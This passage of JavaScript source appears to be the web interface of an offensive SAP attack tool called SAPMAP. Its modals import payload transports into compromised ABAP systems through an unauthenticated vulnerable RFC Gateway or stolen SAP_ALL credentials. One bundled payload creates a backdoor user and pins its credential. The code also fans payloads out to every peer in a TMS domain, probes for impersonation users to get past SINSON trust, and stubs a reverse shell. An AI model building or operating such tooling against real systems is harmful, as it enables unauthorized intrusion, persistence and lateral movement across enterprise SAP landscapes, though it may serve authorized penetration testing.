  formData.append('file', file);
  formData.append('remote_path', remotePath);
  try {
    const resp = await fetch('/api/node/' + _fbSid + '/fs/upload', {
      method: 'POST',
      body: formData
    });
    const res = await resp.json();
    if (res.status === 'started') {
      status.textContent =
        'Uploading ' + file.name + ' → ' + remotePath + '...';
      showToast('Upload started: ' + file.name, 'info');
      _fbWaitForTask(
        _fbSid + ':fs_upload',
        function(timedOut) {
          _fbHideProgress();
          if (timedOut) {
            status.textContent = 'Upload of ' + file.name +
              ' — no completion after 10 min; check console';
          } else {
            status.textContent = 'Uploaded: ' + file.name + ' → ' +
              remotePath + ' (check console for MD5 verify result)';
            showToast('Upload finished: ' + file.name, 'success');
            // Refresh directory so the freshly-uploaded file appears
            if (_fbCurrentPath && remotePath.startsWith(_fbCurrentPath)) {
              fbRefresh();
            }
          }
        },
        function(label) {
          _fbShowProgress(label);
        }
      );
    } else {
      _fbHideProgress();
      status.textContent = 'Upload error: ' + (res.error || 'unknown');
    }
  } catch (e) {
    _fbHideProgress();
    status.textContent = 'Upload error: ' + e;
  }
  input.value = '';
}

function _esc(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

// --- Reverse Shell ---
let _shellPollId = null;
let _shellSid = '';

// =========================================================================
// Import Local Transport modal — Mode B (pwned gw_vulnerable ABAP)
// =========================================================================
let _importTrSid = null;
let _importTrTaskId = null;
let _importTrPollTimer = null;

let _importTrBundled = null;   // selected bundle key ('canary'|'usrcreate'|null)
let _importTrBundles = null;   // cached registry from GET /api/transports/bundled

async function _loadImportTrBundles() {
  if (_importTrBundles) return _importTrBundles;
  try {
    const r = await fetch('/api/transports/bundled');
    const j = await r.json();
    _importTrBundles = (j && Array.isArray(j.bundles)) ? j.bundles : [];
  } catch (e) {
    _importTrBundles = [];
  }
  return _importTrBundles;
}

function _renderImportTrBundledButtons() {
  const holder = document.getElementById('import-tr-bundled-buttons');
  if (!holder) return;
  if (!_importTrBundles || !_importTrBundles.length) {
    holder.innerHTML = '<span style="color:#8b949e;font-size:12px">'
      + '(no bundled payloads found in scripts/transports/)</span>';
    return;
  }
  holder.innerHTML = _importTrBundles.map(b => {
    const verifyTag = b.has_post_verify
      ? '<span style="color:#3fb950;font-size:10px;margin-left:4px">+auto-pin cred</span>'
      : '';
    const active = (_importTrBundled === b.key);
    const style = active
      ? 'background:#0f5b3f;border:1px solid #3fb950;color:#e6edf3'
      : 'background:#161b22;border:1px solid #30363d;color:#e6edf3';
    return '<button type="button" class="btn"'
      + ' style="' + style + ';padding:6px 10px;font-size:12px;text-align:left;line-height:1.3"'
      + ' title="' + escHtml(b.description) + '"'
      + ' onclick="pickImportTrBundle(\'' + escHtml(b.key) + '\')">'
      + '<div><strong>' + escHtml(b.label) + '</strong>' + verifyTag + '</div>'
      + '<div style="color:#8b949e;font-size:10px;margin-top:2px">'
      + escHtml(b.trkorr) + ' — ' + Math.round(b.size / 1024) + ' KB</div>'
      + '</button>';
  }).join('');
}

function pickImportTrBundle(key) {
  _importTrBundled = key;
  const b = (_importTrBundles || []).find(x => x.key === key);
  const selRow = document.getElementById('import-tr-bundled-selected');
  const selTxt = document.getElementById('import-tr-bundled-sel-txt');
  if (b && selRow && selTxt) {
    selTxt.innerHTML = '<strong>Selected:</strong> ' + escHtml(b.label)
      + ' <span style="color:#8b949e">(' + escHtml(b.trkorr) + ')</span>';
    selRow.style.display = '';
  }
  // Disable + grey out the file input while a bundle is picked.
  const fileInput = document.getElementById('import-tr-zip');
  if (fileInput) { fileInput.value = ''; fileInput.disabled = true; }
  const fileRow = document.getElementById('import-tr-file-row');
  if (fileRow) fileRow.style.opacity = '0.4';
  _renderImportTrBundledButtons();
}

function clearImportTrBundled() {
  _importTrBundled = null;
  const selRow = document.getElementById('import-tr-bundled-selected');
  if (selRow) selRow.style.display = 'none';
  const fileInput = document.getElementById('import-tr-zip');
  if (fileInput) fileInput.disabled = false;
  const fileRow = document.getElementById('import-tr-file-row');
  if (fileRow) fileRow.style.opacity = '1';
  _renderImportTrBundledButtons();
}

function showImportTransportModal(sid) {
  _importTrSid = sid;
  _importTrBundled = null;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  _loadImportTrBundles().then(_renderImportTrBundledButtons);
  const selRow = document.getElementById('import-tr-bundled-selected');
  if (selRow) selRow.style.display = 'none';
  const fileRow = document.getElementById('import-tr-file-row');
  if (fileRow) fileRow.style.opacity = '1';

  // Channel availability — derive from the node state.  Mirrors
  // _resolve_channel() in sap_transport_import.py so the modal and
  // backend agree on which radios are live.
  const gwAvail = !!n.gw_vulnerable;
  const credsAvail = ((n.credentials || []).length > 0
                       || (n.created_users || []).length > 0
                       || !!n.pwned);

  // Soft pre-flight: warn (don't block) — the backend re-checks.
  const sysType = (n.system_type || '').toUpperCase();
  let preflight = '';
  if (sysType.indexOf('ABAP') === -1) {
    preflight = '⚠️ This node\'s stack is ' + sysType + ' — transport import requires an ABAP stack and will be refused.';
  } else if (!gwAvail && !credsAvail) {
    preflight = '⚠️ This node has neither a vulnerable RFC Gateway nor SAP_ALL credentials. Provide a working logon (or run "Check GW Vulnerabilities" first) — the import will be refused otherwise.';
  }
  if (preflight) {
    if (!confirm(preflight + '\n\nOpen the modal anyway?')) return;
  }

  document.getElementById('import-tr-sid').textContent = '— target: ' + sid;
  document.getElementById('import-tr-form').style.display = '';
  document.getElementById('import-tr-progress').style.display = 'none';
  document.getElementById('import-tr-result').style.display = 'none';
  document.getElementById('import-tr-go').disabled = false;
  document.getElementById('import-tr-go').textContent = 'Run';
  document.getElementById('import-tr-zip').value = '';
  document.getElementById('import-tr-client').value = (n.clients || []).length
    ? (n.clients[0].nr || n.clients[0] || '001')
    : '001';
  document.getElementById('import-tr-dryrun').checked = true;
  document.getElementById('import-tr-log').textContent = '';
  document.getElementById('import-tr-bar').style.width = '0%';
  document.getElementById('import-tr-counter').textContent = '0 / 0';
  document.getElementById('import-tr-eta').textContent = '—';

  // Wire up channel selector — disable radios whose primitive isn't
  // available on this target and surface what 'Auto' will resolve to.
  const gwRadio   = document.getElementById('import-tr-channel-gw');
  const sxpgRadio = document.getElementById('import-tr-channel-sxpg');
  const autoRadio = document.querySelector('input[name="import-tr-channel"][value="auto"]');
  const autoHint  = document.getElementById('import-tr-auto-hint');
  const note      = document.getElementById('import-tr-channel-note');
  gwRadio.disabled   = !gwAvail;
  sxpgRadio.disabled = !credsAvail;
  document.getElementById('import-tr-channel-gw-lbl').style.opacity   = gwAvail   ? '1' : '0.45';
  document.getElementById('import-tr-channel-sxpg-lbl').style.opacity = credsAvail ? '1' : '0.45';
  autoRadio.checked = true;
  let autoVerdict;
  if (gwAvail) {
    autoVerdict = '(GW SAPXPG — unauthenticated, no destination artifact)';
  } else if (credsAvail) {
    const u = (n.created_users || []).length
      ? (n.created_users[0].username || '?')
      : ((n.credentials || []).find(c => c.verified) || (n.credentials || [])[0] || {}).username || '?';
    autoVerdict = '(SXPG_STEP_XPG_START as ' + u + ')';
  } else {
    autoVerdict = '(no channel available)';
  }
  autoHint.textContent = autoVerdict;
  let notes = [];
  if (!gwAvail)    notes.push('GW disabled — node is not gw_vulnerable.');
  if (!credsAvail) notes.push('SXPG disabled — no SAP_ALL credential on this node.');
  note.textContent = notes.join(' ');

  document.getElementById('import-transport-modal').classList.add('visible');
}

async function runImportTransport() {
  const sid = _importTrSid;
  if (!sid) return;
  const fileInput = document.getElementById('import-tr-zip');
  const useBundle = !!_importTrBundled;
  if (!useBundle && !fileInput.files.length) {
    alert('Pick a bundled payload above, or upload a transport zip.');
    return;
  }
  const client = (document.getElementById('import-tr-client').value || '001').trim();
  const dryRun = document.getElementById('import-tr-dryrun').checked;
  const channelEl = document.querySelector('input[name="import-tr-channel"]:checked');
  const channel = channelEl ? channelEl.value : 'auto';

  if (!dryRun) {
    let extra = '';
    if (useBundle) {
      const b = (_importTrBundles || []).find(x => x.key === _importTrBundled);
      if (b) extra = '\nBundle: ' + b.label + ' (' + b.trkorr + ')';
      if (b && b.has_post_verify) extra += '\nPost-import: RFC_PING verify + auto-pin cred.';
    }
    if (!confirm(
        'Run REAL tp import on ' + sid + ' (client ' + client + ')?\n\n' +
        'This permanently modifies the target\'s ABAP data dictionary.\n' +
        'Cross-domain unconditional flags U1268 will be set.' + extra + '\n\n' +
        'Continue?')) return;
  }

  const fd = new FormData();
  if (useBundle) {
    fd.append('bundled', _importTrBundled);
  } else {
    fd.append('zip', fileInput.files[0]);
  }
  fd.append('target_client', client);
  fd.append('dry_run', dryRun ? '1' : '0');
  fd.append('channel', channel);

  document.getElementById('import-tr-go').disabled = true;
  document.getElementById('import-tr-go').textContent = 'Running…';
  document.getElementById('import-tr-progress').style.display = '';
  document.getElementById('import-tr-log').textContent = '';
  document.getElementById('import-tr-phase').textContent = 'submitting';
  document.getElementById('import-tr-msg').textContent = 'Uploading zip to SAPMAP…';

  let resp;
  try {
    const r = await fetch('/api/node/' + encodeURIComponent(sid) + '/import_transport',
      {method: 'POST', body: fd});
    resp = await r.json();
  } catch (e) {
    showToast('Submit failed: ' + e, 'error');
    document.getElementById('import-tr-go').disabled = false;
    document.getElementById('import-tr-go').textContent = 'Run';
    return;
  }

  if (resp.error || !resp.task_id) {
    showToast('Submit rejected: ' + (resp.error || 'no task_id'), 'error');
    document.getElementById('import-tr-go').disabled = false;
    document.getElementById('import-tr-go').textContent = 'Run';
    return;
  }
  _importTrTaskId = resp.task_id;
  _startImportTrPoll();
}

function _startImportTrPoll() {
  _stopImportTrPoll();
  _importTrPollTimer = setInterval(_pollImportTrProgress, 700);
  _pollImportTrProgress();
}

function _stopImportTrPoll() {
  if (_importTrPollTimer) {
    clearInterval(_importTrPollTimer);
    _importTrPollTimer = null;
  }
}

async function _pollImportTrProgress() {
  if (!_importTrSid || !_importTrTaskId) return;
  let p;
  try {
    const r = await fetch('/api/node/' + encodeURIComponent(_importTrSid)
      + '/transport_progress?task_id=' + encodeURIComponent(_importTrTaskId));
    p = await r.json();
  } catch (e) {
    return; // transient — keep polling
  }
  if (!p || !p.phase) return;

  document.getElementById('import-tr-phase').textContent = p.phase || '';
  document.getElementById('import-tr-msg').textContent = p.message || '';
  document.getElementById('import-tr-bar').style.width = (p.percent || 0) + '%';
  if (p.total) {
    document.getElementById('import-tr-counter').textContent =
      (p.current || 0) + ' / ' + p.total;
  } else {
    document.getElementById('import-tr-counter').textContent = '';
  }
  document.getElementById('import-tr-eta').textContent =
    (p.eta_s && p.eta_s > 0) ? ('ETA ' + p.eta_s + 's') : '—';

  // Append log lines (preserve scroll position when user has scrolled up)
  if (Array.isArray(p.log)) {
    const el = document.getElementById('import-tr-log');
    const stick = (el.scrollTop + el.clientHeight + 4) >= el.scrollHeight;
    el.textContent = p.log.join('\n');
    if (stick) el.scrollTop = el.scrollHeight;
  }

  if (p.phase === 'done' || p.phase === 'error') {
    _stopImportTrPoll();
    document.getElementById('import-tr-go').disabled = false;
    document.getElementById('import-tr-go').textContent = 'Run again';
    _renderImportTrResult(p.result || {});
  }
}

function _renderImportTrResult(res) {
  const el = document.getElementById('import-tr-result');
  el.style.display = '';
  const ok = !!res.ok;
  // tp rc=4 = "tool produced warnings" — still operationally successful
  // (the transport committed), just not pristine.  Show in amber rather
  // than green so the operator sees the nuance, but DO NOT flag it as
  // failure — that misleads operators into thinking the import didn't
  // land when it actually did.
  const warnings = ok && !!res.warnings;
  const color = warnings ? '#d29922' : (ok ? '#3fb950' : '#f85149');
  const title = warnings
    ? '⚠️ Success with warnings (tp rc=4)'
    : (ok ? '✅ Success' : '❌ Failed');
  let html = '<div style="color:' + color + ';font-weight:600;margin-bottom:6px">' + title + '</div>';
  if (warnings) {
    html += '<div style="color:#d29922;margin-bottom:6px;font-size:11px">' +
            'The transport committed but tp reported warnings — common ' +
            'when imported objects rely on a kernel or DDIC feature ' +
            'newer than the target system. Review the tp log below ' +
            'before relying on the imported objects.</div>';
  } else if (res.error) {
    html += '<div style="color:#ffcccc;margin-bottom:6px">' + escHtml(res.error) + '</div>';
  }
  if (res.trkorr) {
    html += '<div><b>Transport:</b> ' + escHtml(res.trkorr) + ' (source ' + escHtml(res.source_sid || '?') + ')</div>';
  }
  if (res.target_sid) {
    html += '<div><b>Target:</b> ' + escHtml(res.target_sid) + ' client ' + escHtml(res.target_client || '?') + '</div>';
  }
  if (res.channel) {
    const chLabel = (res.channel === 'gw')
      ? 'GW SAPXPG (unauthenticated)'
      : (res.channel === 'sxpg' ? 'SXPG_STEP_XPG_START (authenticated)' : res.channel);
    const req = res.channel_requested || 'auto';
    const reqSuffix = (req !== res.channel) ? ' [requested: ' + escHtml(req) + ']' : '';
    html += '<div><b>Exec channel:</b> ' + escHtml(chLabel) + reqSuffix + '</div>';
  }
  if (res.cofile_md5) html += '<div><b>cofile md5:</b> <code>' + escHtml(res.cofile_md5) + '</code></div>';
  if (res.datafile_md5) html += '<div><b>datafile md5:</b> <code>' + escHtml(res.datafile_md5) + '</code></div>';
  html += '<div><b>tp addtobuffer rc:</b> ' + (res.addtobuffer_rc != null ? res.addtobuffer_rc : '—') + '</div>';
  html += '<div><b>tp ' + (res.dry_run ? 'tst' : 'import') + ' rc:</b> ' + (res.import_rc != null ? res.import_rc : '—') + '</div>';
  // Post-import verify block — only present when a bundled payload
  // with a post_import_verify hook was used (e.g. user-create → RFC_PING).
  if (res.post_verify && res.post_verify.attempted) {
    const pv = res.post_verify;
    const pvColor = pv.verified ? '#3fb950' : '#d29922';
    const pvIcon  = pv.verified ? '✅' : '⚠️';
    let pvLine = pvIcon + ' Post-import verify: <b>' + escHtml(pv.username || '?')
      + '</b> / client ' + escHtml(pv.client || '?');
    if (pv.verified) {
      pvLine += ' — RFC_PING OK';
      if (pv.pinned) pvLine += ' — credential pinned to node';
    } else {
      pvLine += ' — failed: ' + escHtml(pv.error || 'unknown');
    }
    html += '<div style="margin-top:6px;color:' + pvColor + '">' + pvLine + '</div>';
    if (pv.verified) {
      html += '<div style="color:#8b949e;font-size:11px;margin-top:2px">'
        + 'XPRA runs under sy-mandt=000 so the user lands in client 000 '
        + 'regardless of the target client above. The credential is now '
        + 'available in the SAP-node ctx-menu.</div>';
    }
  }
  if (res.log_path) {
    html += '<div style="margin-top:6px;color:#8b949e">Full log: <code>' + escHtml(res.log_path) + '</code></div>';
  }
  el.innerHTML = html;
  // Kick a state poll so the new credential shows up in the ctx menu
  // without waiting for the next scheduled tick.
  if (res.post_verify && res.post_verify.verified && res.post_verify.pinned) {
    try { startPolling && startPolling(); } catch(_) {}
  }
}

// -----------------------------------------------------------------------
// TMS Propagate Transport (Bundle 3) — fan out to every peer in the domain
// -----------------------------------------------------------------------
let _tmsPropSid = null;
let _tmsPropTaskId = null;
let _tmsPropPollTimer = null;
let _tmsPropBundled = null;

function _tmsPropRenderBundledButtons() {
  const holder = document.getElementById('tms-prop-bundled-buttons');
  if (!holder) return;
  if (!_importTrBundles || !_importTrBundles.length) {
    holder.innerHTML = '<span style="color:#8b949e;font-size:12px">'
      + '(no bundled payloads found)</span>';
    return;
  }
  holder.innerHTML = _importTrBundles.map(b => {
    const verifyTag = b.has_post_verify
      ? '<span style="color:#3fb950;font-size:10px;margin-left:4px">+auto-pin cred per hop</span>'
      : '';
    const active = (_tmsPropBundled === b.key);
    const style = active
      ? 'background:#0f5b3f;border:1px solid #3fb950;color:#e6edf3'
      : 'background:#161b22;border:1px solid #30363d;color:#e6edf3';
    return '<button type="button" class="btn"'
      + ' style="' + style + ';padding:6px 10px;font-size:12px;text-align:left;line-height:1.3"'
      + ' title="' + escHtml(b.description) + '"'
      + ' onclick="pickTMSPropBundle(\'' + escHtml(b.key) + '\')">'
      + '<div><strong>' + escHtml(b.label) + '</strong>' + verifyTag + '</div>'
      + '<div style="color:#8b949e;font-size:10px;margin-top:2px">'
      + escHtml(b.trkorr) + ' — ' + Math.round(b.size / 1024) + ' KB</div>'
      + '</button>';
  }).join('');
}

function pickTMSPropBundle(key) {
  _tmsPropBundled = key;
  const b = (_importTrBundles || []).find(x => x.key === key);
  const selRow = document.getElementById('tms-prop-bundled-selected');
  const selTxt = document.getElementById('tms-prop-bundled-sel-txt');
  if (b && selRow && selTxt) {
    selTxt.innerHTML = '<strong>Selected:</strong> ' + escHtml(b.label)
      + ' <span style="color:#8b949e">(' + escHtml(b.trkorr) + ')</span>';
    selRow.style.display = '';
  }
  const fileInput = document.getElementById('tms-prop-zip');
  if (fileInput) { fileInput.value = ''; fileInput.disabled = true; }
  const fileRow = document.getElementById('tms-prop-file-row');
  if (fileRow) fileRow.style.opacity = '0.4';
  _tmsPropRenderBundledButtons();
}

function clearTMSPropBundle() {
  _tmsPropBundled = null;
  const selRow = document.getElementById('tms-prop-bundled-selected');
  if (selRow) selRow.style.display = 'none';
  const fileInput = document.getElementById('tms-prop-zip');
  if (fileInput) fileInput.disabled = false;
  const fileRow = document.getElementById('tms-prop-file-row');
  if (fileRow) fileRow.style.opacity = '1';
  _tmsPropRenderBundledButtons();
}

function _tmsPropRenderHopsPreview(sid) {
  const holder = document.getElementById('tms-prop-hops-preview');
  if (!holder) return;
  const n = (mapState.nodes || {})[sid];
  const dests = (n && n.tms_destinations) || [];
  const reachable = dests.filter(d => d && d.target_host && d.logon_ok
                                       && d.target_sid !== sid);
  if (!reachable.length) {
    holder.innerHTML = '<span style="color:#f0883e">No reachable peers — '
      + 'need TMS destinations with logon_ok. Right-click a TMSADM '
      + 'cylinder → "Test TMSADM logon" first.</span>';
    return;
  }
  holder.innerHTML = reachable.map(d => {
    const ctrl = d.is_controller ? ' <span style="color:#39d1c4">CTRL</span>' : '';
    return '<div>' + escHtml(d.target_sid) + ' @ ' + escHtml(d.target_host || '?')
      + ' <span style="color:#8b949e">· domain ' + escHtml(d.domain || '?')
      + '</span>' + ctrl + '</div>';
  }).join('');
}

function showTMSPropagateModal(sid) {
  _tmsPropSid = sid;
  _tmsPropBundled = null;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  _loadImportTrBundles().then(_tmsPropRenderBundledButtons);
  document.getElementById('tms-prop-sid').textContent = '— source: ' + sid;
  document.getElementById('tms-prop-form').style.display = '';
  document.getElementById('tms-prop-progress').style.display = 'none';
  document.getElementById('tms-prop-result').style.display = 'none';
  document.getElementById('tms-prop-go').disabled = false;
  document.getElementById('tms-prop-go').textContent = 'Run';
  document.getElementById('tms-prop-zip').value = '';
  document.getElementById('tms-prop-zip').disabled = false;
  document.getElementById('tms-prop-file-row').style.opacity = '1';
  document.getElementById('tms-prop-bundled-selected').style.display = 'none';
  document.getElementById('tms-prop-client').value = '000';
  document.getElementById('tms-prop-dryrun').checked = true;
  document.getElementById('tms-prop-path-mode').value = 'rfc-first';
  _tmsPropRenderHopsPreview(sid);
  document.getElementById('tms-propagate-modal').classList.add('visible');
  // Reset impersonation section and kick off recon
  document.getElementById('tms-prop-impers-row').style.display = 'none';
  document.getElementById('tms-prop-impers-status').textContent = '';
  document.getElementById('tms-prop-impers-picker').innerHTML =
    '<div style="color:#6e7681;font-size:11px;padding:6px">(Loading candidates…)</div>';
  document.getElementById('tms-prop-impers-test-btn').disabled = true;
  _tmsPropImpersSelected = null;
  _tmsPropStartImpersonationRecon(sid);
}

let _tmsPropImpersSelected = null;
let _tmsPropImpersTaskId = null;
let _tmsPropImpersPollTimer = null;

async function _tmsPropStartImpersonationRecon(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  // Pick the first (or only) TMS destination — the modal currently
  // supports one target at a time via the hops preview.  If multiple,
  // recon runs against the first pending destination.
  const dest = (n.tms_destinations || []).find(d => d.target_sid);
  if (!dest) return;
  try {
    const fd = new FormData();
    fd.append('target_sid', dest.target_sid);
    const r = await fetch(
      '/api/node/' + encodeURIComponent(sid) + '/tms_impersonation_recon',
      { method: 'POST', body: fd });
    const j = await r.json();
    if (j.error) {
      document.getElementById('tms-prop-impers-picker').innerHTML =
        '<div style="color:#f85149;font-size:11px;padding:6px">Recon error: '
        + escHtml(j.error) + '</div>';
      return;
    }
    if (!j.sinson_active) {
      // Secure Trust off — hide the whole section (legacy flow works)
      document.getElementById('tms-prop-impers-row').style.display = 'none';
      return;
    }
    document.getElementById('tms-prop-impers-row').style.display = '';
    _tmsPropRenderImpersonationPicker(j);
  } catch (e) {
    console.error('impers recon:', e);
  }
}

function _tmsPropRenderImpersonationPicker(j) {
  const picker = document.getElementById('tms-prop-impers-picker');
  const pinnedDiv = document.getElementById('tms-prop-impers-pinned');
  const cands = j.candidates || [];
  const pinned = j.persisted_impersonation_user || '';
  if (pinned) {
    pinnedDiv.style.display = '';
    // Row: pinned-user text + inline "Clear pin" button.  Clear
    // is deliberately styled subtly (link-like) so it doesn't
    // compete with the primary "Test impersonation" CTA — this is
    // a maintenance action, not the main workflow.
    pinnedDiv.innerHTML =
      '<div style="display:flex;align-items:center;gap:12px">'
      +   '<span style="flex:1">✓ Impersonation user pinned: <b>'
      +     escHtml(pinned) + '</b> — will be re-used automatically. '
      +     'Pick a different one below to re-test.</span>'
      +   '<a href="#" onclick="return clearTMSImpersonationPin(event);" '
      +      'style="color:#8b949e;font-size:10px;text-decoration:underline;'
      +      'white-space:nowrap;cursor:pointer">Clear pin</a>'
      + '</div>';
  } else {
    pinnedDiv.style.display = 'none';
  }
  if (!cands.length) {
    picker.innerHTML = '<div style="color:#f85149;font-size:11px;padding:6px">'
      + 'No candidates found. '
      + escHtml(j.candidates_error || '') + '</div>';
    return;
  }
  const rankColor = r => r >= 100 ? '#3fb950'
    : r >= 80 ? '#d29922' : r >= 40 ? '#8b949e' : '#6e7681';
  const rows = cands.map((c, i) => {
    const isPinned = c.bname === pinned;
    const checked = (i === 0 && !pinned) || isPinned;
    if (checked) _tmsPropImpersSelected = c.bname;
    const profStr = (c.profiles || []).slice(0, 3).join(', ')
      + ((c.profiles || []).length > 3 ? '…' : '');
    return '<label style="display:flex;gap:8px;align-items:center;padding:4px 6px;font-size:11px;font-family:monospace;color:#e6edf3;cursor:pointer;border-radius:3px" '
      + 'onmouseover="this.style.background=\'#161b22\'" '
      + 'onmouseout="this.style.background=\'\'">'
      + '<input type="radio" name="tms-impers-cand" value="' + escHtml(c.bname) + '"'
      + (checked ? ' checked' : '')
      + ' onchange="_tmsPropImpersSelected=this.value;document.getElementById(\'tms-prop-impers-test-btn\').disabled=false">'
      + '<span style="width:120px">' + escHtml(c.bname) + '</span>'
      + '<span style="width:50px;color:#8b949e">' + escHtml(c.ustyp || '?') + '</span>'
      + '<span style="width:36px;color:' + rankColor(c.rank || 0) + ';font-weight:600">r' + (c.rank || 0) + '</span>'
      + '<span style="flex:1;color:#8b949e">' + escHtml(profStr) + '</span>'
      + '<span style="color:#6e7681">' + escHtml(c.trdat || '') + '</span>'
      + (isPinned ? '<span style="color:#3fb950">✓ pinned</span>' : '')
      + '</label>';
  }).join('');
  picker.innerHTML = rows;
  document.getElementById('tms-prop-impers-test-btn').disabled =
    !_tmsPropImpersSelected;
}

async function clearTMSImpersonationPin(ev) {
  // Called by the "Clear pin" link in the pinned-user banner.
  // POSTs to /api/node/<sid>/tms_impersonation_clear then refreshes
  // the picker so the pinned banner disappears and the operator can
  // pick a fresh candidate (or simply close the modal — the real
  // propagate falls back to _import_via_abap_wrapper when no user
  // is pinned).
  if (ev) { ev.preventDefault(); ev.stopPropagation(); }
  const sid = _tmsPropSid;
  if (!sid) return false;
  const n = (mapState.nodes || {})[sid];
  const dest = (n && n.tms_destinations || []).find(d => d.target_sid);
  if (!dest) return false;
  if (!confirm('Clear the pinned impersonation user for '
                 + sid + '→' + dest.target_sid + '?\n\n'
                 + 'Next Propagate run against this destination will '
                 + 'fall back to plain TMSADM — which fails if the '
                 + 'target still enforces SINSON=1.')) {
    return false;
  }
  try {
    const fd = new FormData();
    fd.append('target_sid', dest.target_sid);
    const r = await fetch(
      '/api/node/' + encodeURIComponent(sid) + '/tms_impersonation_clear',
      { method: 'POST', body: fd });
    const j = await r.json();
    if (j.error) throw new Error(j.error);
    showToast('Impersonation pin cleared for ' + sid + '→'
                + dest.target_sid + ' (was: ' + (j.cleared_user || '?') + ')',
              'success');
    // Refresh the recon so the picker re-renders without the pin.
    _tmsPropStartImpersonationRecon(sid);
  } catch (e) {
    showToast('Clear pin failed: ' + (e.message || e), 'error');
  }
  return false;
}

async function runTMSImpersonationTest() {
  const sid = _tmsPropSid;
  const user = _tmsPropImpersSelected;
  if (!sid || !user) return;
  const n = (mapState.nodes || {})[sid];
  const dest = (n.tms_destinations || []).find(d => d.target_sid);
  if (!dest) return;
  document.getElementById('tms-prop-impers-test-btn').disabled = true;
  document.getElementById('tms-prop-impers-status').textContent =
    '⏳ Submitting XBP job as ' + user + '…';
  try {
    const fd = new FormData();
    fd.append('target_sid', dest.target_sid);
    fd.append('impersonation_user', user);
    const r = await fetch(
      '/api/node/' + encodeURIComponent(sid) + '/tms_impersonation_test',
      { method: 'POST', body: fd });
    const j = await r.json();
    if (j.error) throw new Error(j.error);
    _tmsPropImpersTaskId = j.task_id;
    document.getElementById('tms-prop-progress').style.display = '';
    if (_tmsPropImpersPollTimer) clearInterval(_tmsPropImpersPollTimer);
    _tmsPropImpersPollTimer = setInterval(_tmsPropPollImpers, 700);
    _tmsPropPollImpers();
  } catch (e) {
    document.getElementById('tms-prop-impers-status').textContent =
      '❌ ' + (e.message || e);
    document.getElementById('tms-prop-impers-test-btn').disabled = false;
  }
}

async function _tmsPropPollImpers() {
  const sid = _tmsPropSid;
  if (!sid || !_tmsPropImpersTaskId) return;
  const r = await fetch('/api/node/' + encodeURIComponent(sid)
    + '/tms_propagate_progress?task_id=' + encodeURIComponent(_tmsPropImpersTaskId));
  const p = await r.json();
  if (!p || !p.phase) return;
  document.getElementById('tms-prop-phase').textContent = p.phase;
  document.getElementById('tms-prop-msg').textContent = p.message || '';
  if (p.phase === 'done' || p.phase === 'error') {
    clearInterval(_tmsPropImpersPollTimer);
    _tmsPropImpersPollTimer = null;
    const res = p.result || {};
    const el = document.getElementById('tms-prop-impers-status');
    document.getElementById('tms-prop-impers-test-btn').disabled = false;
    if (res.ok) {
      el.innerHTML = '<span style="color:#3fb950">✅ ' + escHtml(res.impersonation_user)
        + ' verified — pinned. Now click <b>Run</b> to propagate the real payload.</span>';
    } else {
      const cls = res.failure_class || '5?';
      el.innerHTML = '<span style="color:#f85149">❌ [' + escHtml(cls) + '] '
        + escHtml(res.error || 'failed') + '</span>'
        + (res.joblog_tail ? '<pre style="margin-top:6px;padding:6px;background:#0d1117;color:#8b949e;border:1px solid #30363d;border-radius:3px;font-size:10px;max-height:120px;overflow:auto;user-select:text">'
          + escHtml(res.joblog_tail) + '</pre>' : '');
    }
    try { startPolling && startPolling(); } catch(_) {}
  }
}

async function runTMSPropagate() {
  const sid = _tmsPropSid;
  if (!sid) return;
  const useBundle = !!_tmsPropBundled;
  const fileInput = document.getElementById('tms-prop-zip');
  if (!useBundle && !fileInput.files.length) {
    alert('Pick a bundled payload above, or upload a transport zip.');
    return;
  }
  const client   = (document.getElementById('tms-prop-client').value || '000').trim();
  const dryRun   = document.getElementById('tms-prop-dryrun').checked;
  const pathMode = document.getElementById('tms-prop-path-mode').value || 'rfc-first';

  if (!dryRun) {
    const n = (mapState.nodes || {})[sid];
    const peers = ((n && n.tms_destinations) || [])
      .filter(d => d && d.target_host && d.logon_ok && d.target_sid !== sid)
      .map(d => d.target_sid).join(', ');
    if (!confirm(
        'Run REAL propagation from ' + sid + ' to: ' + peers + '\n\n' +
        'Each target receives a tp import with U1268 unconditional flags — ' +
        'this permanently modifies every target\'s ABAP data dictionary.\n\n' +
        'Continue?')) return;
  }

  const fd = new FormData();
  if (useBundle) fd.append('bundled', _tmsPropBundled);
  else           fd.append('zip', fileInput.files[0]);
  fd.append('target_client', client);
  fd.append('dry_run',       dryRun ? '1' : '0');
  fd.append('path_mode',     pathMode);

  document.getElementById('tms-prop-go').disabled = true;
  document.getElementById('tms-prop-go').textContent = 'Running…';
  document.getElementById('tms-prop-progress').style.display = '';
  document.getElementById('tms-prop-phase').textContent = 'submitting';
  document.getElementById('tms-prop-msg').textContent = 'Uploading zip to SAPMAP…';
  document.getElementById('tms-prop-grid').innerHTML = '';

  let resp;
  try {
    const r = await fetch('/api/node/' + encodeURIComponent(sid) + '/tms_propagate',
      {method: 'POST', body: fd});
    resp = await r.json();
  } catch (e) {
    showToast('Submit failed: ' + e, 'error');
    document.getElementById('tms-prop-go').disabled = false;
    document.getElementById('tms-prop-go').textContent = 'Run';
    return;
  }
  if (resp.error || !resp.task_id) {
    showToast('Submit rejected: ' + (resp.error || 'no task_id'), 'error');
    document.getElementById('tms-prop-go').disabled = false;
    document.getElementById('tms-prop-go').textContent = 'Run';
    return;
  }
  _tmsPropTaskId = resp.task_id;
  _startTMSPropPoll();
}

function _startTMSPropPoll() {
  _stopTMSPropPoll();
  _tmsPropPollTimer = setInterval(_pollTMSPropProgress, 700);
  _pollTMSPropProgress();
}

function _stopTMSPropPoll() {
  if (_tmsPropPollTimer) {
    clearInterval(_tmsPropPollTimer);
    _tmsPropPollTimer = null;
  }
}

async function _pollTMSPropProgress() {
  if (!_tmsPropSid || !_tmsPropTaskId) return;
  let p;
  try {
    const r = await fetch('/api/node/' + encodeURIComponent(_tmsPropSid)
      + '/tms_propagate_progress?task_id=' + encodeURIComponent(_tmsPropTaskId));
    p = await r.json();
  } catch (_) { return; }
  if (!p || !p.phase) return;

  document.getElementById('tms-prop-phase').textContent = p.phase || '';
  document.getElementById('tms-prop-msg').textContent = p.message || '';

  const grid = document.getElementById('tms-prop-grid');
  if (grid && Array.isArray(p.hops)) {
    grid.innerHTML = p.hops.map(h => {
      const statusColor =
        h.status === 'success' ? '#3fb950' :
